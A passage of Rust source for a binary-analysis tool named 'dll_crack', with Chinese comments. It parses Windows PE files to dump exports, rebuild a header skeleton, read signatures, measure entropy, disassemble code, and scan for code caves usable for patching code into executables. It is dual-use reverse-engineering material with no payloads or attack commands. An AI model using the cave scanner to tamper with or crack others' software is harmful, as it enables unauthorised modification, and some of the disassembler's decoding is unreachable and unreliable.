    out.push_str(&format!("//  导出: {} 个 | 导入DLL: {} 个\n", exports.len(), imports.len()));
    out.push_str("//  工具: dll_crack v3.0 — decomp\n");
    out.push_str("// ═══════════════════════════════════════════════\n\n");
    
    out.push_str("#include <windows.h>\n");
    
    // Include headers for imported DLLs
    let header_map: HashMap<&str, &str> = [
        ("USER32", "#include <winuser.h>"), ("GDI32", "#include <wingdi.h>"),
        ("ADVAPI32", "#include <winreg.h>"), ("SHELL32", "#include <shlobj.h>"),
        ("COMCTL32", "#include <commctrl.h>"), ("COMDLG32", "#include <commdlg.h>"),
        ("OLE32", "#include <ole2.h>"), ("VERSION", "#include <winver.h>"),
        ("PSAPI", "#include <psapi.h>"), ("dbghelp", "#include <dbghelp.h>"),
        ("vrfcore", "// Application Verifier — vrfcore.dll"),
    ].iter().cloned().collect();
    
    let mut included = std::collections::HashSet::new();
    for (dll, _) in &imports {
        let upper = dll.to_uppercase();
        for (key, header) in &header_map {
            if upper.contains(key) && included.insert(*key) {
                out.push_str(&format!("{}\n", header));
            }
        }
    }
    out.push_str("#include <string>\n#include <vector>\n#include <stdexcept>\n\n");
    
    // Exported functions
    out.push_str(&format!("// ═══ 导出函数 ({} 个) ═══\n", exports.len()));
    for exp in &exports {
        out.push_str(&format!("// DLL_EXPORT ? {}@? — 签名需从PDB恢复\n", exp));
    }
    if exports.len() <= 10 {
        for exp in &exports {
            out.push_str(&format!("extern \"C\" __declspec(dllexport) void* {}(); // 返回类型需从分析确认\n", exp));
        }
    }
    
    // Import summary
    out.push_str(&format!("\n// ═══ 导入DLL ({} 个) ═══\n", imports.len()));
    for (dll, funcs) in &imports {
        out.push_str(&format!("// [{}] — {}个函数\n", dll, funcs.len()));
    }
    
    // Key logic reconstruction based on imports
    out.push_str("\n// ═══ 核心逻辑重建 ═══\n");
    out.push_str("// 基于导入表分析:\n");
    
    let has_vrf = imports.iter().any(|(d,_)| d.to_lowercase().contains("vrfcore"));
    let has_dbghelp = imports.iter().any(|(d,_)| d.to_lowercase().contains("dbghelp"));
    let has_user32 = imports.iter().any(|(d,_)| d.to_lowercase().contains("user32"));
    let has_advapi32 = imports.iter().any(|(d,_)| d.to_lowercase().contains("advapi32"));
    let has_shell32 = imports.iter().any(|(d,_)| d.to_lowercase().contains("shell32"));
    let has_comdlg32 = imports.iter().any(|(d,_)| d.to_lowercase().contains("comdlg32"));
    let has_version = imports.iter().any(|(d,_)| d.to_lowercase().contains("version"));
    let has_psapi = imports.iter().any(|(d,_)| d.to_lowercase().contains("psapi"));
    
    if has_vrf { out.push_str("// [+] Application Verifier 集成 — vrfcore.dll\n"); }
    if has_dbghelp { out.push_str("// [+] 符号/调试支持 — dbghelp.dll\n"); }
    if has_user32 { out.push_str("// [+] GUI对话框 — USER32/GDI32\n"); }
    if has_advapi32 { out.push_str("// [+] 注册表操作 — ADVAPI32\n"); }
    if has_shell32 { out.push_str("// [+] Shell集成 — SHELL32\n"); }
    if has_comdlg32 { out.push_str("// [+] 文件对话框 — COMDLG32\n"); }
    if has_version { out.push_str("// [+] 版本信息 — VERSION\n"); }
    if has_psapi { out.push_str("// [+] 进程枚举 — PSAPI\n"); }
    
    // Key strings
    let relevant: Vec<&String> = strings.iter()
        .filter(|s| s.len() >= 6 && !s.contains('\r') && !s.contains('\n'))
        .take(80)
        .collect();
    if !relevant.is_empty() {
        out.push_str("\n// ═══ 关键字符串 ═══\n");
        for s in &relevant {
            out.push_str(&format!("//   \"{}\"\n", s));
        }
    }
    
    // Structural skeleton
    out.push_str("\n// ═══ 结构骨架 ═══\n");
    out.push_str("class AppVerifUI {\n");
    out.push_str("public:\n");
    out.push_str("    int StartUI(HINSTANCE hInstance);\n");
    out.push_str("    void DisplayMessageBox(const wchar_t* msg);\n");
    out.push_str("private:\n");
    if has_vrf {
        out.push_str("    void EnumerateLayers();\n");
        out.push_str("    void CreateLayer(const wchar_t* name);\n");
        out.push_str("    void ConfigureLayer(const wchar_t* name);\n");
    }
    if has_advapi32 {
        out.push_str("    void LoadSettings();\n");
        out.push_str("    void SaveSettings();\n");
    }
    if has_dbghelp {
        out.push_str("    void ResolveSymbols(const wchar_t* modulePath);\n");
    }
    if has_shell32 {
        out.push_str("    void BrowseForTarget();\n");
    }
    if has_comdlg32 {
        out.push_str("    void OpenConfigFile();\n");
        out.push_str("    void SaveConfigFile();\n");
    }
    out.push_str("};\n");
    
    out.push_str("\n// ═══ 完整逆向需使用 IDA Pro / Ghidra / x64dbg ═══\n");
    out.push_str("// 此输出为导入表+字符串级别的结构化重建\n");
    out.push_str("// 建议: 结合调试器动态分析验证函数签名\n");
    
    Ok(out)
}

// ═══════════════ 导出表转储 v3.1 ═══════════════

fn export_dump(path: &str) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    if data.len() < 64 || u16_le(&data, 0) != 0x5A4D { return Err("无效PE".into()); }
    let pe_off = u32_le(&data, 0x3C) as usize;
    let coff = pe_off + 4;
    let opt_start = coff + 20;
    let magic = u16_le(&data, opt_start);
    let is_x64 = magic == 0x20B;
    let dd_start = opt_start + if is_x64 { 112 } else { 96 };
    let export_rva = u32_le(&data, dd_start);
    let _export_size = u32_le(&data, dd_start + 4);
    if export_rva == 0 { return Err("无导出表".into()); }

    let num_sections = u16_le(&data, coff + 2) as usize;
    let sec_start = coff + 20 + u16_le(&data, coff + 16) as usize;
    let mut sections = Vec::new();
    for i in 0..num_sections {
        let o = sec_start + i * 40;
        sections.push((String::from_utf8_lossy(&data[o..o+8]).trim_end_matches('\0').to_string(),
            u32_le(&data, o+12), u32_le(&data, o+8), u32_le(&data, o+20), u32_le(&data, o+16), u32_le(&data, o+36)));
    }

    let (dll_name, funcs) = parse_exports(&data, {
        let mut off = None;
        for (_, va, vs, ro, rs, _) in &sections {
            if export_rva >= *va && export_rva < va + (*vs).max(*rs) && *rs > 0 {
                off = Some((ro + (export_rva - va)) as usize); break;
            }
        }
        off.ok_or("无法定位导出表")?
    }, &sections)?;

    let mut out = format!("═══ 导出表: {} ═══\n\n", path);
    out.push_str(&format!("[·] DLL名称: {}\n", dll_name));
    out.push_str(&format!("[·] 导出函数: {} 个\n", funcs.len()));
    let named: Vec<_> = funcs.iter().filter(|(_, n)| !n.starts_with("Ordinal_")).collect();
    let ord_only = funcs.len() - named.len();
    out.push_str(&format!("[·] 按名称: {} | 仅序数: {}\n\n", named.len(), ord_only));
    out.push_str("─── 导出函数列表 ───\n");
    for (ord, name) in &funcs {
        out.push_str(&format!("  {:4}. {}\n", ord, name));
    }
    // Check for forwarders
    let fwds: Vec<_> = funcs.iter().filter(|(_, n)| n.contains('.') && !n.starts_with("Ordinal_")).collect();
    if !fwds.is_empty() {
        out.push_str(&format!("\n─── 转发器 ({} 个) ───\n", fwds.len()));
        for (ord, name) in &fwds {
            out.push_str(&format!("  {:4}. {}\n", ord, name));
        }
    }
    Ok(out)
}

// ═══════════════ 代码洞扫描 v3.1 ═══════════════

fn code_cave_scan(path: &str, min_size: usize) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    if data.len() < 64 || u16_le(&data, 0) != 0x5A4D { return Err("无效PE".into()); }
    let pe_off = u32_le(&data, 0x3C) as usize;
    let coff = pe_off + 4;
    let num_sections = u16_le(&data, coff + 2) as usize;
    let sec_start = coff + 20 + u16_le(&data, coff + 16) as usize;
    let opt_start = coff + 20;
    let magic = u16_le(&data, opt_start);
    let is_x64 = magic == 0x20B;
    let image_base = if is_x64 { u64_le(&data, opt_start + 24) } else { u32_le(&data, opt_start + 28) as u64 };

    let mut out = format!("═══ 代码洞扫描: {} ═══\n[·] 最小洞大小: {}B\n\n", path, min_size);
    let mut total_caves = 0usize;
    let mut total_bytes = 0usize;

    for i in 0..num_sections {
        let o = sec_start + i * 40;
        let name = String::from_utf8_lossy(&data[o..o+8]).trim_end_matches('\0').to_string();
        let _vsize = u32_le(&data, o + 8);
        let vaddr = u32_le(&data, o + 12);
        let rsize = u32_le(&data, o + 16);
        let roff = u32_le(&data, o + 20);
        let chars = u32_le(&data, o + 36);
        if rsize == 0 { continue; }
        let sec_data = &data[roff as usize..(roff + rsize) as usize];

        let executable = chars & 0x20000000 != 0;
        let sec_label = format!("{} ({})", name, if executable { "可执行" } else { "不可执行" });

        let mut caves = Vec::new();
        let mut start: Option<usize> = None;
        for (j, &b) in sec_data.iter().enumerate() {
            if b == 0x00 || b == 0xCC || b == 0x90 {
                if start.is_none() { start = Some(j); }
            } else {
                if let Some(s) = start {
                    let len = j - s;
                    if len >= min_size { caves.push((s, len)); }
                    start = None;
                }
            }
        }
        if let Some(s) = start {
            let len = sec_data.len() - s;
            if len >= min_size { caves.push((s, len)); }
        }

        if !caves.is_empty() {
            out.push_str(&format!("─── {} ───\n", sec_label));
            for &(s, len) in &caves {
                let file_off = roff as usize + s;
                let va = image_base + vaddr as u64 + s as u64;
                out.push_str(&format!("  [+] 0x{:016X} (文件:0x{:08X}) {}B\n", va, file_off, len));
                total_caves += 1;
                total_bytes += len;
            }
            out.push_str("\n");
        }
    }

    // Also check section slack (vsize - rsize)
    out.push_str("─── 节间Slack空间 ───\n");
    for i in 0..num_sections {
        let o = sec_start + i * 40;
        let name = String::from_utf8_lossy(&data[o..o+8]).trim_end_matches('\0').to_string();
        let vsize = u32_le(&data, o + 8) as usize;
        let rsize = u32_le(&data, o + 16) as usize;
        let vaddr = u32_le(&data, o + 12);
        let _roff = u32_le(&data, o + 20);
        let chars = u32_le(&data, o + 36);
        let slack = vsize.saturating_sub(rsize);
        if slack >= min_size {
            let executable = chars & 0x20000000 != 0;
            let va = image_base + vaddr as u64 + rsize as u64;
            out.push_str(&format!("  [+] {} slack: 0x{:016X} {}B {}\n", name, va, slack,
                if executable { "[可执行]" } else { "" }));
            total_caves += 1;
            total_bytes += slack;
        }
    }

    out.push_str(&format!("\n─── 总计: {} 个洞, {}KB 可用空间 ───\n", total_caves, total_bytes/1024));
    Ok(out)
}

// ═══════════════ 数字签名分析 v3.1 ═══════════════

fn sign_analyze(path: &str) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    if data.len() < 64 || u16_le(&data, 0) != 0x5A4D { return Err("无效PE".into()); }
    let pe_off = u32_le(&data, 0x3C) as usize;
    let coff = pe_off + 4;
    let opt_start = coff + 20;
    let magic = u16_le(&data, opt_start);
    let dd_start = opt_start + if magic == 0x20B { 112 } else { 96 };
    let sec_rva = u32_le(&data, dd_start + 32);
    let sec_size = u32_le(&data, dd_start + 36);

    if sec_rva == 0 || sec_size == 0 { return Err("无数字签名".into()); }

    let mut out = format!("═══ 数字签名分析: {} ═══\n\n", path);
    out.push_str(&format!("[·] 安全目录RVA: 0x{:08X}\n", sec_rva));
    out.push_str(&format!("[·] 签名数据大小: {}KB\n", sec_size/1024));
    out.push_str(&format!("[·] 签名占比: {:.1}%\n\n", (sec_size as f64 / data.len() as f64) * 100.0));

    // 安全目录通常指向文件末尾的证书数据
    // WIN_CERTIFICATE: dwLength(u32) + wRevision(u16) + wCertificateType(u16) + bCertificate
    if let Some(sig_off) = {
        let so = sec_rva as usize;
        if so + 8 <= data.len() { Some(so) } else { None }
    } {
        let cert_len = u32_le(&data, sig_off) as usize;
        let revision = u16_le(&data, sig_off + 4);
        let cert_type = u16_le(&data, sig_off + 6);

        let type_str = match cert_type {
            0x0002 => "WIN_CERT_TYPE_PKCS_SIGNED_DATA",
            0x0001 => "WIN_CERT_TYPE_X509",
            0x0003 => "WIN_CERT_TYPE_RESERVED_1",
            0x0004 => "WIN_CERT_TYPE_TS_STACK_SIGNED",
            _ => "未知",
        };
        out.push_str(&format!("[·] 证书类型: {} (0x{:04X})\n", type_str, cert_type));
        out.push_str(&format!("[·] 证书总长: {}B\n", cert_len));
        out.push_str(&format!("[·] 修订版本: {}\n\n", revision));

        if cert_type == 0x0002 && sig_off + 8 < data.len() {
            // PKCS#7 SignedData — 简单解析OID和字符串
            let pkcs_data = &data[sig_off + 8..];
            out.push_str("─── PKCS#7 SignedData ───\n");

            // Extract readable strings from certificate data
            let mut strings = Vec::new();
            let mut current = Vec::new();
            for &b in pkcs_data.iter().take(cert_len.min(65536)) {
                if b.is_ascii_graphic() || b == b' ' || b == b'.' {
                    current.push(b);
                } else {
                    if current.len() >= 3 && !current.iter().all(|&c| c == b' ' || c == b'.') {
                        let s = String::from_utf8_lossy(&current);
                        if !strings.contains(&s.to_string()) && s.len() >= 3 {
                            strings.push(s.to_string());
                        }
                    }
                    current.clear();
                }
            }

            // 提取关键信息
            let known_tags = ["Microsoft Corporation", "Microsoft Windows", "Microsoft Root",
                "Washington", "Redmond", "nShield", "Time-Stamp", "Code Signing",
                "Certificate Authority", "PCA", "DigiCert", "GlobalSign", "VeriSign"];
            let mut org_info = Vec::new();
            let mut urls = Vec::new();
            let mut emails = Vec::new();
            for s in &strings {
                for tag in &known_tags {
                    if s.contains(tag) { org_info.push(s.clone()); break; }
                }
                if s.starts_with("http") { urls.push(s.clone()); }
                if s.contains('@') && s.contains('.') { emails.push(s.clone()); }
            }
            org_info.sort(); org_info.dedup();
            urls.sort(); urls.dedup();

            out.push_str("[·] 组织信息:\n");
            for s in &org_info { out.push_str(&format!("    {}\n", s)); }
            if !urls.is_empty() {
                out.push_str("\n[·] CRL/OCSP URL:\n");
                for s in &urls { out.push_str(&format!("    {}\n", s)); }
            }
            if !emails.is_empty() {
                out.push_str("\n[·] 邮箱:\n");
                for s in &emails { out.push_str(&format!("    {}\n", s)); }
            }

            // 查找有效性日期 (ASN.1 UTCTime/GeneralizedTime)
            out.push_str("\n[·] 日期信息:\n");
            let mut dates = Vec::new();
            let mut i = 0;
            while i + 14 < pkcs_data.len().min(cert_len) {
                // UTCTime: YYMMDDHHMMSSZ
                if pkcs_data[i].is_ascii_digit() && pkcs_data[i+1].is_ascii_digit()
                    && pkcs_data[i+6].is_ascii_digit() && pkcs_data[i+7].is_ascii_digit() {
                    if pkcs_data[i+12] == b'Z' && pkcs_data[i..i+12].iter().all(|b| b.is_ascii_digit()) {
                        let ds = String::from_utf8_lossy(&pkcs_data[i..i+13]);
                        dates.push(ds.to_string());
                        i += 13; continue;
                    }
                }
                // GeneralizedTime: YYYYMMDDHHMMSSZ
                if pkcs_data[i].is_ascii_digit() && pkcs_data[i+3].is_ascii_digit() {
                    if i + 15 < pkcs_data.len() && pkcs_data[i+14] == b'Z'
                        && pkcs_data[i..i+14].iter().all(|b| b.is_ascii_digit()) {
                        let ds = String::from_utf8_lossy(&pkcs_data[i..i+15]);
                        dates.push(ds.to_string());
                        i += 15; continue;
                    }
                }
                i += 1;
            }
            dates.dedup();
            if dates.len() >= 2 {
                out.push_str(&format!("    有效期从: {}\n", dates[1]));
                out.push_str(&format!("    有效期至: {}\n", dates[0]));
            }
            for d in &dates {
                out.push_str(&format!("    {}\n", d));
            }

            out.push_str(&format!("\n[·] PKCS#7总大小: {}KB\n", cert_len/1024));
        }
    }

    Ok(out)
}

// ═══════════════ 熵值分析 v3.1 ═══════════════

fn entropy_scan(path: &str) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    if data.len() < 64 || u16_le(&data, 0) != 0x5A4D { return Err("无效PE".into()); }
    let pe_off = u32_le(&data, 0x3C) as usize;
    let coff = pe_off + 4;
    let num_sections = u16_le(&data, coff + 2) as usize;
    let sec_start = coff + 20 + u16_le(&data, coff + 16) as usize;

    let mut out = format!("═══ 熵值分析: {} ═══\n\n", path);
    out.push_str("[·] Shannon熵: 0=有序 4=中等 8=完全随机\n");
    out.push_str("[!] 熵>7.0 通常表示加密/压缩/加壳\n\n");

    let mut max_entropy = 0.0f64;
    let mut suspicious = Vec::new();

    for i in 0..num_sections {
        let o = sec_start + i * 40;
        let name = String::from_utf8_lossy(&data[o..o+8]).trim_end_matches('\0').to_string();
        let rsize = u32_le(&data, o + 16) as usize;
        let roff = u32_le(&data, o + 20) as usize;
        if rsize == 0 || roff + rsize > data.len() { continue; }

        let sec_data = &data[roff..roff + rsize];
        // Shannon entropy
        let mut counts = [0u32; 256];
        for &b in sec_data { counts[b as usize] += 1; }
        let len = sec_data.len() as f64;
        let mut entropy = 0.0f64;
        for &c in &counts {
            if c > 0 {
                let p = c as f64 / len;
                entropy -= p * p.log2();
            }
        }
        if entropy > max_entropy { max_entropy = entropy; }

        let bar = "█".repeat((entropy / 8.0 * 40.0) as usize);
        let flag = if entropy > 7.0 { " [!] 可疑!" } else if entropy > 6.0 { " [*] 偏高" } else { "" };
        out.push_str(&format!("  {:10}  {:.4}  {}{}\n", name, entropy, bar, flag));

        if entropy > 6.5 { suspicious.push(name.clone()); }
    }

    out.push_str(&format!("\n─── 总结 ───\n"));
    out.push_str(&format!("[·] 最高熵值: {:.4}\n", max_entropy));
    if suspicious.is_empty() {
        out.push_str("[+] 未检测到高熵节, 文件不太可能被加壳/加密\n");
    } else {
        out.push_str(&format!("[!] 高熵节: {} — 可能被加壳/加密!\n", suspicious.join(", ")));
    }
    // 整体文件熵
    let mut counts = [0u32; 256];
    for &b in &data { counts[b as usize] += 1; }
    let len = data.len() as f64;
    let mut overall = 0.0f64;
    for &c in &counts { if c > 0 { let p = c as f64 / len; overall -= p * p.log2(); } }
    out.push_str(&format!("[·] 整体文件熵: {:.4}\n", overall));

    Ok(out)
}

// ═══════════════ 轻量反汇编器 v3.1 ═══════════════

fn disassemble(path: &str, rva: Option<u32>, count: usize) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    if data.len() < 64 || u16_le(&data, 0) != 0x5A4D { return Err("无效PE".into()); }
    let pe_off = u32_le(&data, 0x3C) as usize;
    let coff = pe_off + 4;
    let opt_start = coff + 20;
    let magic = u16_le(&data, opt_start);
    let is_x64 = magic == 0x20B;
    let entry_rva = if is_x64 { u64_le(&data, opt_start + 16) } else { u32_le(&data, opt_start + 16) as u64 };
    let image_base = if is_x64 { u64_le(&data, opt_start + 24) } else { u32_le(&data, opt_start + 28) as u64 };

    let num_sections = u16_le(&data, coff + 2) as usize;
    let sec_start = coff + 20 + u16_le(&data, coff + 16) as usize;
    let mut sections = Vec::new();
    for i in 0..num_sections {
        let o = sec_start + i * 40;
        sections.push((u32_le(&data, o+12), u32_le(&data, o+8), u32_le(&data, o+20), u32_le(&data, o+16)));
    }

    let target_rva = rva.unwrap_or(entry_rva as u32);

    // RVA → file offset
    let file_off = {
        let mut off = None;
        for &(va, vs, ro, rs) in &sections {
            if target_rva >= va && target_rva < va + vs.max(rs) && rs > 0 {
                off = Some((ro + (target_rva - va)) as usize); break;
            }
        }
        off.ok_or(format!("RVA 0x{:08X} 不在任何节中", target_rva))?
    };

    let mut out = format!("═══ 反汇编: {} ═══\n", path);
    out.push_str(&format!("[·] 架构: {} | 起始RVA: 0x{:08X} | 指令数: {}\n", if is_x64 {"x64"} else {"x86"}, target_rva, count));
    out.push_str(&format!("[·] 镜像基址: 0x{:016X}\n\n", image_base));
    out.push_str("  地址           字节                                  指令\n");
    out.push_str("  ────           ────                                  ────\n");

    let mut offset = file_off;
    let mut dis_count = 0usize;
    let max_offset = (file_off + 4096).min(data.len());

    while offset < max_offset && dis_count < count {
        let rva_now = target_rva as usize + (offset - file_off);
        let va = image_base + rva_now as u64;
        let (inst_str, inst_len) = disasm_one(&data, offset, is_x64);
        let bytes_str: String = data[offset..(offset+inst_len).min(data.len())]
            .iter().map(|b| format!("{:02X}", b)).collect::<Vec<_>>().join(" ");
        out.push_str(&format!("  {:016X}  {:40}  {}\n", va, bytes_str, inst_str));
        offset += inst_len;
        dis_count += 1;
        if inst_len == 0 { offset += 1; } // skip bad byte
    }

    Ok(out)
}

fn disasm_one(data: &[u8], offset: usize, is_x64: bool) -> (String, usize) {
    if offset >= data.len() { return ("???".into(), 0); }
    let b = data[offset];

    // REX prefix (x64 only)
    let mut rex_w = false;
    let mut rex_r = false;
    let mut _rex_x = false;
    let mut rex_b = false;
    let mut cur = offset;
    if is_x64 && b >= 0x40 && b <= 0x4F {
        rex_w = b & 0x08 != 0;
        rex_r = b & 0x04 != 0;
        _rex_x = b & 0x02 != 0;
        rex_b = b & 0x01 != 0;
        cur += 1;
        if cur >= data.len() { return ("???".into(), 1); }
    }
    let op = data[cur];

    // Operand size prefix
    let mut opsize_16 = false;
    if op == 0x66 { opsize_16 = true; cur += 1; if cur >= data.len() { return ("???".into(), 1); } }
    let op = data[cur];

    let opsize = if rex_w { 8 } else if opsize_16 { 2 } else { 4 };

    let _regs8 = ["al","cl","dl","bl","ah","ch","dh","bh"];
    let regs16 = ["ax","cx","dx","bx","sp","bp","si","di"];
    let regs32 = ["eax","ecx","edx","ebx","esp","ebp","esi","edi"];
    let regs64 = ["rax","rcx","rdx","rbx","rsp","rbp","rsi","rdi"];
    let regs = if opsize == 8 { &regs64[..] } else if opsize == 2 { &regs16[..] } else { &regs32[..] };

    let get_modrm = |off: usize| -> (u8, u8, u8) {
        if off + 1 >= data.len() { return (0, 0, 0); }
        let m = data[off];
        ((m >> 6) & 3, (m >> 3) & 7, m & 7)
    };

    let modrm_str = |off: usize, opsize: usize| -> String {
        let (mod_, _reg, rm) = get_modrm(off);
        let rs = if opsize == 8 { &regs64 } else if opsize == 2 { &regs16 } else { &regs32 };
        match mod_ {
            0 => {
                if rm == 5 { format!("[{}]", if opsize == 8 { "rip+disp32" } else { "disp32" }) }
                else if rm == 4 { "[sib]".into() }
                else { format!("[{}]", rs[rm as usize]) }
            }
            1 => {
                if off + 2 > data.len() { return "?".into(); }
                let d = data[off+1] as i8 as i32;
                format!("[{}{}{}]", rs[rm as usize], if d>=0 {"+"} else {""}, d)
            }
            2 => {
                if off + 5 > data.len() { return "?".into(); }
                let d = i32::from_le_bytes([data[off+1],data[off+2],data[off+3],data[off+4]]);
                format!("[{}{}{}]", rs[rm as usize], if d>=0 {"+"} else {""}, d)
            }
            3 => rs[rm as usize].to_string(),
            _ => "?".into(),
        }
    };

    let reg_name = |reg: u8, rex: bool| -> String {
        let idx = (reg as usize + if rex { 8 } else { 0 }) % 16;
        if opsize == 8 {
            ["rax","rcx","rdx","rbx","rsp","rbp","rsi","rdi","r8","r9","r10","r11","r12","r13","r14","r15"][idx].into()
        } else if opsize == 2 {
            ["ax","cx","dx","bx","sp","bp","si","di","r8w","r9w","r10w","r11w","r12w","r13w","r14w","r15w"][idx].into()
        } else {
            ["eax","ecx","edx","ebx","esp","ebp","esi","edi","r8d","r9d","r10d","r11d","r12d","r13d","r14d","r15d"][idx].into()
        }
    };

    match op {
        // NOP
        0x90 => ("nop".into(), cur - offset + 1),
        // RET
        0xC3 => ("ret".into(), cur - offset + 1),
        0xC2 if cur + 2 < data.len() => {
            let imm = u16::from_le_bytes([data[cur+1], data[cur+2]]);
            (format!("ret 0x{:04X}", imm), cur - offset + 3)
        }
        // INT3
        0xCC => ("int3".into(), cur - offset + 1),
        // INT
        0xCD if cur + 1 < data.len() => (format!("int 0x{:02X}", data[cur+1]), cur - offset + 2),
        // PUSH reg
        0x50..=0x57 => (format!("push {}", regs[op as usize - 0x50]), cur - offset + 1),
        // POP reg
        0x58..=0x5F => (format!("pop {}", regs[op as usize - 0x58]), cur - offset + 1),
        // PUSH imm32
        0x68 if cur + 4 < data.len() => {
            let imm = u32::from_le_bytes([data[cur+1],data[cur+2],data[cur+3],data[cur+4]]);
            (format!("push 0x{:08X}", imm), cur - offset + 5)
        }
        // PUSH imm8
        0x6A if cur + 1 < data.len() => (format!("push 0x{:02X}", data[cur+1]), cur - offset + 2),
        // JMP short
        0xEB if cur + 1 < data.len() => {
            let rel = data[cur+1] as i8;
            (format!("jmp 0x{:X}", cur as isize + 2 + rel as isize), cur - offset + 2)
        }
        // JMP rel32
        0xE9 if cur + 4 < data.len() => {
            let rel = i32::from_le_bytes([data[cur+1],data[cur+2],data[cur+3],data[cur+4]]);
            (format!("jmp 0x{:X}", cur as isize + 5 + rel as isize), cur - offset + 5)
        }
        // CALL rel32
        0xE8 if cur + 4 < data.len() => {
            let rel = i32::from_le_bytes([data[cur+1],data[cur+2],data[cur+3],data[cur+4]]);
            (format!("call 0x{:X}", cur as isize + 5 + rel as isize), cur - offset + 5)
        }
        // Jcc short (70-7F)
        0x70..=0x7F if cur + 1 < data.len() => {
            let jcc = ["jo","jno","jb","jnb","jz","jnz","jbe","ja","js","jns","jp","jnp","jl","jge","jle","jg"];
            let rel = data[cur+1] as i8;
            (format!("{} 0x{:X}", jcc[op as usize - 0x70], cur as isize + 2 + rel as isize), cur - offset + 2)
        }
        // MOV r,rm (8B)
        0x8B if cur + 1 < data.len() => {
            let (_, reg, _) = get_modrm(cur+1);
            let rm = modrm_str(cur+1, opsize);
            (format!("mov {}, {}", reg_name(reg, rex_r), rm), cur - offset + 2 + modrm_size(&data, cur+1))
        }
        // MOV rm,r (89)
        0x89 if cur + 1 < data.len() => {
            let (_, reg, _) = get_modrm(cur+1);
            let rm = modrm_str(cur+1, opsize);
            (format!("mov {}, {}", rm, reg_name(reg, rex_r)), cur - offset + 2 + modrm_size(&data, cur+1))
        }
        // LEA
        0x8D if cur + 1 < data.len() => {
            let (_, reg, _) = get_modrm(cur+1);
            let rm = modrm_str(cur+1, opsize);
            (format!("lea {}, {}", reg_name(reg, rex_r), rm), cur - offset + 2 + modrm_size(&data, cur+1))
        }
        // MOV reg, imm (B8-BF)
        0xB8..=0xBF => {
            let reg_idx = (op - 0xB8) as usize;
            let sz = if opsize >= 4 { 4 } else if opsize == 2 { 2 } else { 1 };
            if cur + sz < data.len() {
                let imm: u64 = match sz {
                    1 => data[cur+1] as u64,
                    2 => u16::from_le_bytes([data[cur+1],data[cur+2]]) as u64,
                    _ => u32::from_le_bytes([data[cur+1],data[cur+2],data[cur+3],data[cur+4]]) as u64,
                };
                (format!("mov {}, 0x{:X}", reg_name(reg_idx as u8, rex_b), imm), cur - offset + 1 + sz)
            } else { ("???".into(), 0) }
        }
        // TEST rm,r
        0x85 if cur + 1 < data.len() => {
            let (_, reg, _) = get_modrm(cur+1);
            let rm = modrm_str(cur+1, opsize);
            (format!("test {}, {}", rm, reg_name(reg, rex_r)), cur - offset + 2 + modrm_size(&data, cur+1))
        }
        // CMP rm,imm (group1)
        0x81 if cur + 1 < data.len() => {
            let (_, reg, _) = get_modrm(cur+1);
            let rm = modrm_str(cur+1, opsize);
            let msz = modrm_size(&data, cur+1);
            let ops = ["add","or","adc","sbb","and","sub","xor","cmp"];
            let opname = ops[reg as usize];
            if cur + 1 + msz + 3 < data.len() {
                let imm_off = cur + 1 + msz;
                let imm = u32::from_le_bytes([data[imm_off],data[imm_off+1],data[imm_off+2],data[imm_off+3]]);
                (format!("{} {}, 0x{:X}", opname, rm, imm), cur - offset + 1 + msz + 4)
            } else { ("???".into(), 0) }
        }
        // CMP rm,imm8 (group1 short)
        0x83 if cur + 1 < data.len() => {
            let (_, reg, _) = get_modrm(cur+1);
            let rm = modrm_str(cur+1, opsize);
            let msz = modrm_size(&data, cur+1);
            let ops = ["add","or","adc","sbb","and","sub","xor","cmp"];
            if cur + 1 + msz < data.len() {
                let imm = data[cur + 1 + msz] as i8;
                (format!("{} {}, {}", ops[reg as usize], rm, imm), cur - offset + 2 + msz)
            } else { ("???".into(), 0) }
        }
        // MOV rm,imm32 (C7)
        0xC7 if cur + 1 < data.len() => {
            let (_, reg, _) = get_modrm(cur+1);
            if reg == 0 {
                let rm = modrm_str(cur+1, opsize);
                let msz = modrm_size(&data, cur+1);
                if cur + 1 + msz + 3 < data.len() {
                    let imm_off = cur + 1 + msz;
                    let imm = u32::from_le_bytes([data[imm_off],data[imm_off+1],data[imm_off+2],data[imm_off+3]]);
                    (format!("mov {}, 0x{:X}", rm, imm), cur - offset + 1 + msz + 4)
                } else { ("???".into(), 0) }
            } else { ("???".into(), 0) }
        }
        // XOR (31/33)
        0x31 | 0x33 if cur + 1 < data.len() => {
            let (_, reg, _) = get_modrm(cur+1);
            let rm = modrm_str(cur+1, opsize);
            (format!("xor {}, {}", rm, reg_name(reg, rex_r)), cur - offset + 2 + modrm_size(&data, cur+1))
        }
        // ADD/ADC/SUB/SBB/AND/OR/CMP (00-3D)
        0x00..=0x3D if cur + 1 < data.len() => {
            let ops = ["add","or","adc","sbb","and","sub","xor","cmp"];
            let op_idx = (op >> 3) as usize;
            let _dir = if op & 0x02 != 0 { "r,rm" } else { "rm,r" };
            let (_, reg, _) = get_modrm(cur+1);
            let rm = modrm_str(cur+1, opsize);
            let rn = reg_name(reg, rex_r);
            if op & 0x02 != 0 {
                (format!("{} {}, {}", ops[op_idx], rn, rm), cur - offset + 2 + modrm_size(&data, cur+1))
            } else {
                (format!("{} {}, {}", ops[op_idx], rm, rn), cur - offset + 2 + modrm_size(&data, cur+1))
            }
        }
        // FF group5: INC/DEC/CALL/JMP/PUSH
        0xFF if cur + 1 < data.len() => {
            let (_, reg, _) = get_modrm(cur+1);
            let rm = modrm_str(cur+1, opsize);
            let ops = ["inc","dec","call","call far","jmp","jmp far","push","??"];
            (format!("{} {}", ops[reg as usize], rm), cur - offset + 2 + modrm_size(&data, cur+1))
        }
        // LEAVE
        0xC9 => ("leave".into(), cur - offset + 1),
        // SYSCALL
        0x0F if cur + 1 < data.len() => {
            match data[cur+1] {
                0x05 => ("syscall".into(), cur - offset + 2),
                0x34 => ("sysenter".into(), cur - offset + 2),
                0x1F if cur + 2 < data.len() => {
                    match data[cur+2] {
                        0x00 => ("nop dword [rax]".into(), cur - offset + 3),
                        0x40 => ("nop dword [rax+00]".into(), cur - offset + 4),
                        0x44 => ("nop dword [rax+rax+00]".into(), cur - offset + 5),
